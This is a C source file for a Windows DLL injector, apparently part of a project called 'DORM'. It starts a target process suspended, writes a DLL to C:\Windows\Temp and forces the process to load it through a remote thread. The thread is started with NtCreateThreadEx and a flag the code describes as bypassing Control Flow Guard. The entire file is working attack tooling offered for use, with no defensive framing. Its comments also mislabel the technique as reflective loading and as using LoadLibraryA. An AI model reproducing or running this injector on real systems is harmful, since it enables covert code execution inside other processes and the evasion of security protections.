/*
 * DORM — Phase 10: Remote Injector (shellcode + LoadLibraryA)
 * ==============================================================
 * Writes DLL to a temp file on disk, then creates a remote thread
 * that calls kernel32!LoadLibraryA with the file path.
 * This bypasses CFG (LoadLibraryA is a valid target) and works
 * on any process.
 */

#include <windows.h>
#include <stdio.h>
#include <stddef.h>

#define TEMP_DLL_PATH L"C:\\Windows\\Temp\\dorm_injected.dll"

/* ── NtCreateThreadEx for CFG bypass ────────────────────────────────────── */
typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    LPVOID lpBytesBuffer
);

#define THREAD_CREATE_FLAGS_BYPASS_CFG_AND_APC 0x00000004

BOOL dorm_reflective_inject(
    LPCWSTR host_path,
    LPBYTE  dll_bytes,
    DWORD   dll_size)
{
    BOOL result = FALSE;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PROCESS_INFORMATION pi;
    STARTUPINFOW        si;

    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    /* Step 1: spawn host process suspended */
    if (!CreateProcessW(host_path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    /* Step 2: write DLL to temp file */
    hFile = CreateFileW(TEMP_DLL_PATH, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        SetLastError(ERROR_WRITE_FAULT);
        goto cleanup;
    }
    DWORD written = 0;
    WriteFile(hFile, dll_bytes, dll_size, &written, NULL);
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    /* Step 3: allocate memory in remote process for the DLL path string */
    size_t path_size = (wcslen(TEMP_DLL_PATH) + 1) * sizeof(wchar_t);
    LPVOID remote_path = VirtualAllocEx(pi.hProcess, NULL, path_size,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_path) goto cleanup;

    if (!WriteProcessMemory(pi.hProcess, remote_path,
                            TEMP_DLL_PATH, path_size, NULL))
        goto cleanup;

    /* Step 4: get kernel32!LoadLibraryW address (same in all processes) */
    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC pLoadLibraryW = GetProcAddress(hK32, "LoadLibraryW");
    if (!pLoadLibraryW) {
        SetLastError(ERROR_PROC_NOT_FOUND);
        goto cleanup;
    }

    /* Step 5: resolve NtCreateThreadEx for clean thread creation */
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pfnNtCreateThreadEx pNtCreateThreadEx =
        (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    HANDLE rthread = NULL;

    if (pNtCreateThreadEx) {
        /* Use NtCreateThreadEx with CFG bypass */
        NTSTATUS status = pNtCreateThreadEx(
            &rthread,
            THREAD_ALL_ACCESS, NULL,
            pi.hProcess,
            (LPTHREAD_START_ROUTINE)pLoadLibraryW,
            remote_path,
            THREAD_CREATE_FLAGS_BYPASS_CFG_AND_APC,
            0, 0, 0, NULL
        );
        if (status != 0 || !rthread) {
            /* Fallback: use CreateRemoteThread (may fail on CFG) */
            rthread = CreateRemoteThread(
                pi.hProcess, NULL, 0,
                (LPTHREAD_START_ROUTINE)pLoadLibraryW,
                remote_path, 0, NULL);
        }
    } else {
        rthread = CreateRemoteThread(
            pi.hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibraryW,
            remote_path, 0, NULL);
    }

    if (!rthread) {
        printf("[inject] CreateRemoteThread failed error=%lu\n", GetLastError());
        goto cleanup;
    }

    /* Step 6: wait for LoadLibraryW to finish */
    DWORD wait_result = WaitForSingleObject(rthread, 5000);
    DWORD thread_exit = 0;
    GetExitCodeThread(rthread, &thread_exit);
    CloseHandle(rthread);

    printf("[inject] LoadLibraryW result: 0x%lx\n", thread_exit);
    fflush(stdout);

    if (wait_result != WAIT_OBJECT_0 || thread_exit == 0) {
        goto cleanup;
    }

    /* Step 7: resume host process */
    if (ResumeThread(pi.hThread) == (DWORD)-1) goto cleanup;
    result = TRUE;

cleanup:
    ;
    DWORD saved = GetLastError();
    if (!result && pi.hProcess) TerminateProcess(pi.hProcess, 1);
    if (pi.hThread)  CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (!result)     SetLastError(saved);
    return result;
}